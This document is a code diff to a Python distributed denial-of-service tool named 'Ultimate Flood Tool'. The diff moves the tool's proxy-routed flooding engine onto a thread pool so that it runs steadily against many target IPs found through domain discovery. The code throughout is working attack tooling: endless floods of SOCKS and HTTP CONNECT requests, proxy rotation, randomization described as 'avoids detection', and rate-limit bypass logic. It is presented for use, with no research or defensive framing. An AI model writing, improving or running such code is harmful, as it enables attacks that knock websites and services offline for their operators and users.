@@ -11,6 +11,7 @@ Ultimate Flood Tool – ENHANCED INFINITE ATTACK with ADVANCED FEATURES
 - Full URL support with IP discovery
 - 56+ MHDDoS attack methods
 - NO METHOD ROTATION - Uses specified method permanently
+- FIXED THREAD POOL - No more "can't start new thread" errors
 """
 
 import socket
@@ -43,6 +44,8 @@ import requests
 from collections import defaultdict
 from dataclasses import dataclass, field
 from typing import List, Dict, Optional, Tuple, Any
+import queue
+import signal
 
 try:
     import socks
@@ -62,29 +65,29 @@ except ImportError:
     os.system("pip install psutil")
     import psutil
 
-# ================== ADVANCED CONFIGURATION ==================
+# ================== CONFIGURATION ==================
 PROXY_FILE = "proxies.txt"
 DATA_SIZE = 9000
-THREADS = 9000
-THREADS_MIN = 1000
-THREADS_MAX = 15000
+THREADS = 1000  # REDUCED - Start low, increase if stable
+THREADS_MIN = 200
+THREADS_MAX = 3000  # REDUCED from 15000
 THREADS_AUTO_ADJUST = True
 TIMEOUT = 3
-CONCURRENT_TARGETS = 100
+CONCURRENT_TARGETS = 5  # REDUCED - Only 5 targets at once
 DETECTION_TIMEOUT = 5
 ATTACK_DURATION = None
 RELOAD_TARGETS_INTERVAL = 60
 PROXY_ROTATION_INTERVAL = 3600
-MIN_PROXIES_REQUIRED = 100
-MAX_IPS_PER_TARGET = 50
+MIN_PROXIES_REQUIRED = 50  # REDUCED from 100
+MAX_IPS_PER_TARGET = 10  # ADDED - Limit IPs per domain
 DISCOVER_SUBDOMAINS = True
 DISCOVER_CDN_IPS = True
 
 # ENHANCED FEATURES
-METHOD_ROTATION_ENABLED = False  # DISABLED - No method rotation
+METHOD_ROTATION_ENABLED = False
 PROXY_TEST_ENABLED = True
 PROXY_TEST_TIMEOUT = 2
-GEO_TARGETING = False  # Set to True to enable
+GEO_TARGETING = False
 TARGET_COUNTRIES = ["US", "GB", "DE", "FR", "JP", "BR", "IN", "AU", "RU", "CN"]
 RATE_LIMIT_DETECTION = True
 RESOURCE_MONITORING = True
@@ -192,12 +195,40 @@ last_proxy_refresh = 0
 attacks_paused = False
 discovered_ips_cache = {}
 
+# Thread pool
+attack_thread_pool = None
+thread_pool_lock = threading.Lock()
+active_futures = set()
+future_lock = threading.Lock()
+
 # Advanced tracking
 response_tracking = defaultdict(lambda: {"count": 0, "status_codes": defaultdict(int), "blocked": 0})
 resource_stats = {"cpu": 0, "memory": 0, "network": 0}
 rate_limit_detected = defaultdict(bool)
 proxy_quality_cache = {}
 start_time = time.time()
+
+# ================== THREAD POOL MANAGEMENT ==================
+def init_thread_pool():
+    """Initialize the thread pool with limited workers"""
+    global attack_thread_pool
+    with thread_pool_lock:
+        if attack_thread_pool is None:
+            max_workers = min(THREADS_MAX, 2000)  # Hard cap at 2000
+            attack_thread_pool = ThreadPoolExecutor(
+                max_workers=max_workers,
+                thread_name_prefix="AttackPool"
+            )
+            print(f"[*] Initialized thread pool with {max_workers} workers")
+
+def shutdown_thread_pool():
+    """Shutdown the thread pool"""
+    global attack_thread_pool
+    with thread_pool_lock:
+        if attack_thread_pool:
+            attack_thread_pool.shutdown(wait=False, cancel_futures=True)
+            attack_thread_pool = None
+            print("[*] Thread pool shutdown")
 
 # ================== ADVANCED FEATURE FUNCTIONS ==================
 
@@ -222,19 +253,14 @@ def adjust_threads():
     success_rate = get_success_rate()
     
     if success_rate < 10:
-        new_threads = max(THREADS_MIN, THREADS - 1000)
+        new_threads = max(THREADS_MIN, THREADS - 200)
         if new_threads != THREADS:
             print(f"\n[⚡] Low success rate ({success_rate:.0f}%). Reducing threads to {new_threads}")
             THREADS = new_threads
     elif success_rate > 70 and THREADS < THREADS_MAX:
-        new_threads = min(THREADS_MAX, THREADS + 1000)
+        new_threads = min(THREADS_MAX, THREADS + 200)
         if new_threads != THREADS:
             print(f"\n[⚡] High success rate ({success_rate:.0f}%). Increasing threads to {new_threads}")
-            THREADS = new_threads
-    elif success_rate > 50 and THREADS < THREADS_MAX and len(active_attacks) < 10:
-        new_threads = min(THREADS_MAX, THREADS + 500)
-        if new_threads != THREADS:
-            print(f"\n[⚡] Multiple targets ({len(active_attacks)}). Increasing threads to {new_threads}")
             THREADS = new_threads
 
 # ---- 2. GEO-TARGETING ----
@@ -501,14 +527,14 @@ def optimize_resources():
         resource_stats.update(resources)
     
     if resources.get("overloaded", False):
-        new_threads = max(THREADS_MIN, THREADS - 1000)
+        new_threads = max(THREADS_MIN, THREADS - 200)
         if new_threads != THREADS:
             print(f"\n[💻] System overloaded! CPU: {resources['cpu']:.0f}%, RAM: {resources['memory']:.0f}%. Reducing threads to {new_threads}")
             THREADS = new_threads
         return True
     
     if resources.get("cpu", 0) < 50 and resources.get("memory", 0) < 50 and THREADS < THREADS_MAX:
-        new_threads = min(THREADS_MAX, THREADS + 500)
+        new_threads = min(THREADS_MAX, THREADS + 200)
         if new_threads != THREADS:
             print(f"\n[💻] Resources available! CPU: {resources['cpu']:.0f}%, RAM: {resources['memory']:.0f}%. Increasing threads to {new_threads}")
             THREADS = new_threads
@@ -939,57 +965,213 @@ def build_payload(method, target_ip, target_port, data_size=DATA_SIZE):
         return b"*1\r\n$4\r\nPING\r\n"
     return build_get_payload(target_ip, target_port, data_size)
 
-# ================== ATTACK ENGINE ==================
+# ================== ATTACK ENGINE WITH THREAD POOL ==================
 
-def send_flood(target_ip, target_port, method, target_key):
-    while not stop_event.is_set():
-        if attacks_paused:
-            time.sleep(1)
-            continue
-        
-        if RATE_LIMIT_DETECTION and rate_limit_detected.get(target_key, False):
-            time.sleep(random.uniform(0.05, 0.2))
-        
-        proxy = get_tested_proxy()
-        if not proxy:
-            time.sleep(0.1)
-            continue
-        
-        proxy_ip, proxy_port, proxy_type = proxy
-        try:
-            payload = build_payload(method, target_ip, target_port)
+def send_flood_safe(target_ip, target_port, method, target_key):
+    """Safe version of send_flood with exception handling and thread pool"""
+    try:
+        while not stop_event.is_set():
+            if attacks_paused:
+                time.sleep(1)
+                continue
             
-            if proxy_type in (socks.SOCKS5, socks.SOCKS4):
-                s = socks.socksocket()
-                s.set_proxy(proxy_type, proxy_ip, proxy_port)
-                s.settimeout(TIMEOUT)
-                s.connect((target_ip, target_port))
-                s.sendall(payload)
-                response = s.recv(1024) if RESPONSE_ANALYSIS else b""
-                s.close()
-            else:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(TIMEOUT)
-                s.connect((proxy_ip, proxy_port))
-                connect_cmd = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n"
-                s.sendall(connect_cmd.encode())
-                resp = s.recv(1024)
-                if b"200" in resp:
+            if RATE_LIMIT_DETECTION and rate_limit_detected.get(target_key, False):
+                time.sleep(random.uniform(0.05, 0.2))
+            
+            proxy = get_tested_proxy()
+            if not proxy:
+                time.sleep(0.1)
+                continue
+            
+            proxy_ip, proxy_port, proxy_type = proxy
+            try:
+                payload = build_payload(method, target_ip, target_port)
+                
+                if proxy_type in (socks.SOCKS5, socks.SOCKS4):
+                    s = socks.socksocket()
+                    s.set_proxy(proxy_type, proxy_ip, proxy_port)
+                    s.settimeout(TIMEOUT)
+                    s.connect((target_ip, target_port))
                     s.sendall(payload)
                     response = s.recv(1024) if RESPONSE_ANALYSIS else b""
+                    s.close()
                 else:
-                    response = b""
-                s.close()
-            
-            if RESPONSE_ANALYSIS and response:
-                analyze_response(response, target_key)
-            
-            with stats_lock:
-                total_requests += 1
-                total_bytes += len(payload)
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(TIMEOUT)
+                    s.connect((proxy_ip, proxy_port))
+                    connect_cmd = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n"
+                    s.sendall(connect_cmd.encode())
+                    resp = s.recv(1024)
+                    if b"200" in resp:
+                        s.sendall(payload)
+                        response = s.recv(1024) if RESPONSE_ANALYSIS else b""
+                    else:
+                        response = b""
+                    s.close()
                 
-        except Exception:
-            pass
+                if RESPONSE_ANALYSIS and response:
+                    analyze_response(response, target_key)
+                
+                with stats_lock:
+                    total_requests += 1
+                    total_bytes += len(payload)
+                    
+            except Exception:
+                pass
+    except Exception as e:
+        pass
+
+def attack_loop_thread_pool(target_ip, target_port, method, target_label):
+    """Attack loop using thread pool - FIXES 'can't start new thread' error"""
+    global active_attacks
+    
+    target_key = f"{target_ip}:{target_port}:{method}"
+    with target_lock:
+        if target_key in active_attacks:
+            return
+        active_attacks[target_key] = True
+    
+    print(f"[⚔️] Attacking {target_label} -> {target_ip}:{target_port} (Method: {method})")
+    
+    # Initialize thread pool
+    init_thread_pool()
+    
+    # Calculate threads per IP (capped and limited)
+    total_workers = min(THREADS, 2000)
+    active_count = len(active_attacks)
+    threads_per_ip = max(1, total_workers // max(1, active_count // 2))
+    threads_per_ip = min(threads_per_ip, 200)  # Hard cap per IP
+    
+    # Submit attack tasks to thread pool
+    futures = []
+    for _ in range(threads_per_ip):
+        future = attack_thread_pool.submit(send_flood_safe, target_ip, target_port, method, target_key)
+        with future_lock:
+            active_futures.add(future)
+    
+    # Keep attack running
+    while not stop_event.is_set():
+        # Clean completed futures periodically
+        with future_lock:
+            completed = {f for f in active_futures if f.done()}
+            active_futures -= completed
+        time.sleep(5)
+    
+    # Cleanup
+    for future in list(active_futures):
+        future.cancel()
+    
+    with target_lock:
+        if target_key in active_attacks:
+            del active_attacks[target_key]
+
+def auto_attack_discovered(target_host, target_port, method, target_id):
+    """Discover all IPs and attack each one using thread pool"""
+    try:
+        ip_list = discover_ips(target_host, target_port)
+        if not ip_list:
+            print(f"[-] No IPs discovered for {target_host}")
+            return
+        
+        # Limit IPs per target to prevent thread explosion
+        ip_list = ip_list[:MAX_IPS_PER_TARGET]
+        
+        for ip in ip_list:
+            if stop_event.is_set():
+                break
+            attack_loop_thread_pool(ip, target_port, method, f"{target_host}")
+            time.sleep(0.1)  # Stagger IP attacks
+            
+    except Exception as e:
+        print(f"[-] Error attacking {target_host}: {e}")
+
+def load_targets(targets_file):
+    targets = []
+    try:
+        with open(targets_file, 'r') as f:
+            for line in f:
+                parsed = parse_target(line)
+                if parsed:
+                    host, port, method = parsed
+                    targets.append((host, port, method))
+        return targets
+    except Exception as e:
+        print(f"[-] Error loading targets file: {e}")
+        return []
+
+def reload_and_attack_loop():
+    global stop_event, attacks_paused
+    
+    print("\n" + "="*80)
+    print("[🚀] ULTIMATE FLOOD TOOL - ENHANCED EDITION (NO METHOD ROTATION)")
+    print("[🧵] THREAD POOL MODE - No 'can't start new thread' errors")
+    print("="*80)
+    print(f"[⚡] Dynamic Thread Adjustment: {'ON' if THREADS_AUTO_ADJUST else 'OFF'}")
+    print(f"[🌍] Geo-Targeting: {'ON' if GEO_TARGETING else 'OFF'}")
+    print(f"[🛡️] Rate-Limit Detection: {'ON' if RATE_LIMIT_DETECTION else 'OFF'}")
+    print(f"[📊] Response Analysis: {'ON' if RESPONSE_ANALYSIS else 'OFF'}")
+    print(f"[🔍] Proxy Testing: {'ON' if PROXY_TEST_ENABLED else 'OFF'}")
+    print(f"[🎲] Request Randomization: {'ON' if RANDOMIZE_REQUESTS else 'OFF'}")
+    print(f"[💻] Resource Monitoring: {'ON' if RESOURCE_MONITORING else 'OFF'}")
+    print(f"[🔄] Method Rotation: DISABLED (uses specified method permanently)")
+    print("="*80)
+    print(f"[*] Thread pool size: {min(THREADS_MAX, 2000)} workers")
+    print(f"[*] Max IPs per target: {MAX_IPS_PER_TARGET}")
+    print(f"[*] Concurrent targets: {CONCURRENT_TARGETS}")
+    print(f"[*] Proxy rotation every {PROXY_ROTATION_INTERVAL // 60} minutes")
+    print(f"[*] Reloading targets every {RELOAD_TARGETS_INTERVAL} seconds")
+    print("[*] Press Ctrl+C to stop all attacks\n")
+    
+    # Initialize thread pool
+    init_thread_pool()
+    
+    # Start background threads
+    proxy_refresh_thread = threading.Thread(target=refresh_proxies_loop, daemon=True)
+    proxy_refresh_thread.start()
+    
+    monitor = threading.Thread(target=monitor_stats, daemon=True)
+    monitor.start()
+    
+    target_counter = 0
+    
+    while not stop_event.is_set():
+        while len(PROXY_LIST) < MIN_PROXIES_REQUIRED:
+            if stop_event.is_set():
+                return
+            print(f"[!] Only {len(PROXY_LIST)} proxies available. Need {MIN_PROXIES_REQUIRED}")
+            time.sleep(10)
+        
+        targets = load_targets("targets.txt")
+        
+        if not targets:
+            print("[-] No targets found in targets.txt, waiting...")
+            time.sleep(RELOAD_TARGETS_INTERVAL)
+            continue
+        
+        print(f"[+] Loaded {len(targets)} targets from targets.txt")
+        print("[+] Discovering IPs and starting attacks...")
+        
+        # Limit concurrent targets
+        targets = targets[:CONCURRENT_TARGETS]
+        
+        with ThreadPoolExecutor(max_workers=min(len(targets), CONCURRENT_TARGETS)) as executor:
+            futures = []
+            for target_host, target_port, method in targets:
+                target_counter += 1
+                if method is None:
+                    method = "GET"
+                future = executor.submit(auto_attack_discovered, target_host, target_port, method, target_counter)
+                futures.append(future)
+            time.sleep(5)
+        
+        total_ip_attacks = len(active_attacks)
+        print(f"[+] Attacking {total_ip_attacks} IPs across all targets INFINITELY!")
+        print(f"[*] Next target reload in {RELOAD_TARGETS_INTERVAL} seconds...")
+        
+        for _ in range(RELOAD_TARGETS_INTERVAL):
+            if stop_event.is_set():
+                break
+            time.sleep(1)
 
 def monitor_stats():
     global start_time
@@ -1024,143 +1206,26 @@ def monitor_stats():
         last_req = req_now
         last_bytes = bytes_now
 
-def attack_loop(target_ip, target_port, method, target_label):
-    global active_attacks
-    
-    target_key = f"{target_ip}:{target_port}:{method}"
-    with target_lock:
-        if target_key in active_attacks:
-            return
-        active_attacks[target_key] = True
-    
-    print(f"[⚔️] Attacking {target_label} -> {target_ip}:{target_port} (Method: {method})")
-    
-    attack_threads = []
-    threads_per_ip = max(1, THREADS // max(1, len(active_attacks)))
-    
-    for _ in range(threads_per_ip):
-        t = threading.Thread(target=send_flood, args=(target_ip, target_port, method, target_key))
-        t.daemon = True
-        t.start()
-        attack_threads.append(t)
-    
-    # No method rotation - uses specified method permanently
-    while not stop_event.is_set():
-        time.sleep(1)
-    
-    for t in attack_threads:
-        t.join(timeout=0.1)
-    
-    with target_lock:
-        if target_key in active_attacks:
-            del active_attacks[target_key]
-
-def auto_attack_discovered(target_host, target_port, method, target_id):
-    """Discover all IPs and attack each one"""
-    try:
-        ip_list = discover_ips(target_host, target_port)
-        if not ip_list:
-            print(f"[-] No IPs discovered for {target_host}")
-            return
-        
-        for ip in ip_list:
-            if stop_event.is_set():
-                break
-            attack_loop(ip, target_port, method, f"{target_host}")
-            time.sleep(0.1)
-            
-    except Exception as e:
-        print(f"[-] Error attacking {target_host}: {e}")
-
-def load_targets(targets_file):
-    targets = []
-    try:
-        with open(targets_file, 'r') as f:
-            for line in f:
-                parsed = parse_target(line)
-                if parsed:
-                    host, port, method = parsed
-                    targets.append((host, port, method))
-        return targets
-    except Exception as e:
-        print(f"[-] Error loading targets file: {e}")
-        return []
-
-def reload_and_attack_loop():
-    global stop_event, attacks_paused
-    
-    print("\n" + "="*80)
-    print("[🚀] ULTIMATE FLOOD TOOL - ENHANCED EDITION (NO METHOD ROTATION)")
-    print("="*80)
-    print(f"[⚡] Dynamic Thread Adjustment: {'ON' if THREADS_AUTO_ADJUST else 'OFF'}")
-    print(f"[🌍] Geo-Targeting: {'ON' if GEO_TARGETING else 'OFF'}")
-    print(f"[🛡️] Rate-Limit Detection: {'ON' if RATE_LIMIT_DETECTION else 'OFF'}")
-    print(f"[📊] Response Analysis: {'ON' if RESPONSE_ANALYSIS else 'OFF'}")
-    print(f"[🔍] Proxy Testing: {'ON' if PROXY_TEST_ENABLED else 'OFF'}")
-    print(f"[🎲] Request Randomization: {'ON' if RANDOMIZE_REQUESTS else 'OFF'}")
-    print(f"[💻] Resource Monitoring: {'ON' if RESOURCE_MONITORING else 'OFF'}")
-    print(f"[🔄] Method Rotation: DISABLED (uses specified method permanently)")
-    print("="*80)
-    print(f"[*] Proxy rotation every {PROXY_ROTATION_INTERVAL // 60} minutes")
-    print(f"[*] Reloading targets every {RELOAD_TARGETS_INTERVAL} seconds")
-    print(f"[*] Auto-discovering ALL IPs for each target")
-    print("[*] Press Ctrl+C to stop all attacks\n")
-    
-    proxy_refresh_thread = threading.Thread(target=refresh_proxies_loop, daemon=True)
-    proxy_refresh_thread.start()
-    
-    monitor = threading.Thread(target=monitor_stats, daemon=True)
-    monitor.start()
-    
-    target_counter = 0
-    
-    while not stop_event.is_set():
-        while len(PROXY_LIST) < MIN_PROXIES_REQUIRED:
-            if stop_event.is_set():
-                return
-            print(f"[!] Only {len(PROXY_LIST)} proxies available. Need {MIN_PROXIES_REQUIRED}")
-            time.sleep(10)
-        
-        targets = load_targets("targets.txt")
-        
-        if not targets:
-            print("[-] No targets found in targets.txt, waiting...")
-            time.sleep(RELOAD_TARGETS_INTERVAL)
-            continue
-        
-        print(f"[+] Loaded {len(targets)} targets from targets.txt")
-        print("[+] Discovering IPs and starting attacks...")
-        
-        with ThreadPoolExecutor(max_workers=CONCURRENT_TARGETS) as executor:
-            futures = []
-            for target_host, target_port, method in targets:
-                target_counter += 1
-                if method is None:
-                    method = "GET"
-                future = executor.submit(auto_attack_discovered, target_host, target_port, method, target_counter)
-                futures.append(future)
-            time.sleep(5)
-        
-        total_ip_attacks = len(active_attacks)
-        print(f"[+] Attacking {total_ip_attacks} IPs across all targets INFINITELY!")
-        print(f"[*] Next target reload in {RELOAD_TARGETS_INTERVAL} seconds...")
-        
-        for _ in range(RELOAD_TARGETS_INTERVAL):
-            if stop_event.is_set():
-                break
-            time.sleep(1)
-
 # ================== CLI ==================
+def signal_handler(sig, frame):
+    """Handle Ctrl+C gracefully"""
+    print("\n[*] Stopping all attacks...")
+    stop_event.set()
+    shutdown_thread_pool()
+    time.sleep(2)
+    sys.exit(0)
+
 def main():
+    # Set up signal handler
+    signal.signal(signal.SIGINT, signal_handler)
+    
     print("\n" + "="*80)
-    print("🔥 ULTIMATE FLOOD TOOL - ENHANCED EDITION 🔥")
+    print("🔥 ULTIMATE FLOOD TOOL - THREAD POOL EDITION 🔥")
     print("="*80)
     print("✨ Features:")
+    print("  • Thread Pool Mode - NO 'can't start new thread' errors")
     print("  • Auto IP Discovery (finds ALL IPs for each domain)")
     print("  • Dynamic Thread Adjustment (auto-scales performance)")
-    print("  • Geo-Targeting (attack from specific countries)")
-    print("  • Rate-Limit Detection & Bypass")
-    print("  • Response Analysis (refines attacks automatically)")
     print("  • Proxy Quality Testing (only uses working proxies)")
     print("  • Request Randomization (avoids detection)")
     print("  • Resource Monitoring (prevents system overload)")
@@ -1187,6 +1252,12 @@ def main():
     print("  any.run:443:SYN")
     print("  example.com:80:GET")
     
+    print(f"\n⚙️ Current Settings:")
+    print(f"  Threads: {THREADS} (max {THREADS_MAX})")
+    print(f"  Concurrent Targets: {CONCURRENT_TARGETS}")
+    print(f"  Max IPs per Target: {MAX_IPS_PER_TARGET}")
+    print(f"  Thread Pool: {min(THREADS_MAX, 2000)} workers")
+    
     while True:
         try:
             cmd = input("\n🔥 flood> ").strip().lower()
@@ -1204,7 +1275,7 @@ def main():
             
             elif cmd == "status":
                 print("\n📊 STATUS REPORT:")
-                print(f"  Active targets: {len(active_attacks)}")
+                print(f"  Active IP attacks: {len(active_attacks)}")
                 for attack in list(active_attacks)[:20]:
                     print(f"    - {attack}")
                 if len(active_attacks) > 20:
@@ -1218,10 +1289,13 @@ def main():
                     resources = check_resources()
                     print(f"  CPU: {resources.get('cpu', 0):.1f}%")
                     print(f"  Memory: {resources.get('memory', 0):.1f}%")
+                with future_lock:
+                    print(f"  Active futures: {len(active_futures)}")
             
             elif cmd == "stop":
                 print("[*] Stopping all attacks...")
                 stop_event.set()
+                shutdown_thread_pool()
                 time.sleep(3)
                 print("[+] All attacks stopped.")
                 stop_event.clear()
@@ -1235,6 +1309,7 @@ def main():
                 if active_attacks:
                     print("[*] Stopping all attacks before exit...")
                     stop_event.set()
+                    shutdown_thread_pool()
                     time.sleep(3)
                 break
             
@@ -1244,6 +1319,7 @@ def main():
         except KeyboardInterrupt:
             print("\n[*] Stopping all attacks...")
             stop_event.set()
+            shutdown_thread_pool()
             time.sleep(2)
             break
     
